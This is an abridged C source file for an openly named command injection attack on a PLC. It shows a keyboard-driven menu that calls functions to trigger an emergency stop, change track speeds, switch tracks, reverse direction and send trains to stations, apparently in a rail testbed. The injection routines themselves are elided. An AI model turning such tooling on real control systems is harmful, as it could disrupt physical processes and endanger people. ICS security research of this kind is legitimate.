/* command_injection.c
	It is used to manipulate PLC by using command injection attack
...
int main(void)
{
	...
	for (;;)
	{
		if (kbhit())				// if any input from the keyboard
		{
			...
			case 48: EmergencyStop(); printf("======== Emergency stop ========\n"); break;
			//inside speed	(press 1,2,3,4)
			case 49: InsideSpeedZero(); printf("======== Inside track speed to 0 ========\n"); break;
			case 50: InsideSpeedMid1(); printf("======== Inside track speed to 1/3 ========\n"); break;
			case 51: InsideSpeedMid2(); printf("======== Inside track speed to 2/3 ========\n"); break;
			case 52: InsideSpeedMax(); printf("======== Inside track speed to max ========\n"); break;
			//outside speed	(press 6,7,8,9)
			case 54: OutsideSpeedZero(); printf("======== Outside track speed to 0 ========\n"); break;
			case 55: OutsideSpeedMid1(); printf("======== Outside track speed to 1/3 ========\n"); break;
			case 56: OutsideSpeedMid2(); printf("======== Outside track speed to 2/3 ========\n"); break;
			case 57: OutsideSpeedMax(); printf("======== Outside track speed to max ========\n"); break;
			//change track to cross	(press x or X)
			case 88: CrossTrack(); printf("======== Track to cross ========\n"); break;
			case 120: CrossTrack(); printf("======== Track to cross ========\n"); break;
			//change track to parallel	(press z or Z)
			case 90: ParallelTrack(); printf("======== Track to parallel ========\n"); break;
			case 122: ParallelTrack(); printf("======== Track to parallel ========\n"); break;
			//inside clockwise	(press i or I)
			case 73: InsideCW(); printf("======== Change inside track to CW ========\n"); break;
			case 105: InsideCW(); printf("======== Change inside track to CW ========\n"); break;
			//inside counter clockwise	(press u or U)
			case 85: InsideCCW(); printf("======== Change inside track to CCW ========\n"); break;
			case 117: InsideCCW(); printf("======== Change inside track to CCW ========\n"); break;
			//outside clockwise		(press o or O)
			case 79: OutsideCW(); printf("======== Change outside track to CW ========\n"); break;
			case 111: OutsideCW(); printf("======== Change outside track to CW ========\n"); break;
			//outside counter clockwise		(press p or P)
			case 80: OutsideCCW(); printf("======== Change outside track to CCW ========\n"); break;
			case 112: OutsideCCW(); printf("======== Change outside track to CCW ========\n"); break;
			//enter manual mode		(press m or M)
			case 77: ManualMode(); printf("======== To manual mode ========\n"); break;
			case 109: ManualMode(); printf("======== To manual mode ========\n"); break;
			//enter auto mode		(press a or A)
			case 65: AutoMode(); printf("======== To auto mode ========\n"); break;
			case 97: AutoMode(); printf("======== To auto mode ========\n"); break;
			//to station 2		(press s or S)
			case 83: ToStation2(); printf("======== Automatically to station 2 ========\n"); break;
			case 115: ToStation2(); printf("======== Automatically to station 2 ========\n"); break;
			//to station 3		(press d or D)
			case 68: ToStation3(); printf("======== Automatically to station 3 ========\n"); break;
			case 100: ToStation3(); printf("======== Automatically to station 3 ========\n"); break;
			//to station 4		(press f or F)
			case 70: ToStation4(); printf("======== Automatically to station 4 ========\n"); break;
			case 102: ToStation4(); printf("======== Automatically to station 4 ========\n"); break;
